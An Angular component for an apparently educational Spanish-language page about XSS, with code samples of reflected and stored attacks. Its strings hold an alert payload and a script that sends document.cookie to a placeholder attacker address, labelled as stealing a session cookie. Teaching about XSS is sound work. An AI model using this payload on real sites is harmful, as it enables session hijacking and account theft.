import { Component, AfterViewInit, OnInit } from '@angular/core';
import { Title } from '@angular/platform-browser';
import Prism from 'prismjs';

@Component({
  selector: 'app-xss',
  templateUrl: './xss.component.html',
  styleUrls: ['./xss.component.css']
})
export class XssComponent implements AfterViewInit, OnInit  {
  pageTitle: string = '';
  panelHeader: string = 'Codigo XSS';
  codigoXSScookie: string = 'script para obtener la cookie';
  codigoXSSalert: string = 'script alert';
  panelHeaderReflected: string = 'Reflected XSS';
  panelHeaderStored: string = 'Stored XSS';
  ejemplo1: string = 'Ejemplo 1: Alert cada vez que se entra a  un post';
  ejemplo2: string = 'Ejemplo 2: Robar cookie de sesion';
  panelXSSHeader: string = 'Que es XSS';
  codeContentAlert:  string = `Test XSS <script>alert("PruebaXSS");</script>`;
  codeContentAlertCookie:  string = `<script>alert(document.cookie);</script>`;
  codesendCookie:  string = `
  <script>
    var request = new XMLHttpRequest();
    request.open('GET', 'http://<TU_IP>:<PUERTO>/?cookie=' + document.cookie);
    request.send();
  </script>`;
  
  codeContent: string = `if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }
  if(test){
    // código
  } else {
    // otro código
  }`;
  
  
  constructor(private titleService: Title) { }

  ngOnInit(): void {
    this.pageTitle = 'Cross-Site Scripting (XSS)';
    this.titleService.setTitle(this.pageTitle);
  }

  ngAfterViewInit(): void {
    Prism.highlightAll(); // Resalta la sintaxis del código
  }

  copyContent(param: any) {
    const codeContainer = document.querySelector(param) as HTMLElement;
    console.log(codeContainer);
    if (codeContainer) {
      const range = document.createRange();
      range.selectNode(codeContainer);
      window.getSelection()?.removeAllRanges();
      window.getSelection()?.addRange(range);
      document.execCommand('copy'); // Copia el texto seleccionado al portapapeles
      window.getSelection()?.removeAllRanges();
    }
  }
}
